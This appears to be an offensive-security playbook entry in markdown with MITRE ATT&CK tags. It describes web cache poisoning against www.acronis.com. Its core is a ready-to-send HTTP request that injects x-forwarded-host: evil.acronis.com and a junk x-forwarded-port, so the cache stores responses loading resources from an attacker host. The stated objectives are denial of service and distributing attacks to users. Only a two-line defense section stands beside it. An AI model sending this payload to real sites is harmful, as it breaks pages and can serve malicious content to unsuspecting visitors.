---
tags:
  - web-cache-poisoning
  - header-manipulation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/alternative-poison-request-x-forwarded-host]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ac872b68-88b3-4390-91bf-12aba98af9d2
created_at: '2025-12-13T09:00:34.193Z'
updated_at: '2025-12-13T09:00:34.193Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Alternative Poisoning with X-Forwarded-Host

## Summary

This procedure uses x-forwarded-host and x-forwarded-port headers to poison the cache, altering the host in responses to point to a malicious domain, causing DoS or enabling attacks like XSS.

## Description

By setting a malicious host like evil.acronis.com and invalid port, the cache stores responses that load resources from the wrong location, breaking the page and potentially distributing malicious content to users.

## Requirements

1. Access to www.acronis.com
2. Burp Suite for request manipulation
3. Control over a malicious domain (optional for full impact)

## Defense

Defensive measures and detection strategies:

- Validate and normalize forwarded headers
- Monitor for suspicious host values

## Objectives

1. Poison cache with malicious host
2. Cause resource loading failures
3. Enable attack distribution

## Instructions

### Step 1: Send Alternative Poisoning Request

**Context**: Include both x-forwarded-host and x-forwarded-port in the request.

**Command** ([[commands/alternative-poison-request-x-forwarded-host]]):
```bash
GET /zh-cn/careers/?yig1bt7ai4=2 HTTP/1.1
Host: www.acronis.com
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
x-forwarded-port: zwrtxqvas9lm4kzkia
x-forwarded-host: evil.acronis.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

> Poisons the cache with malicious host and port.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/alternative-poison-request-x-forwarded-host]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- web-cache-poisoning
- header-manipulation
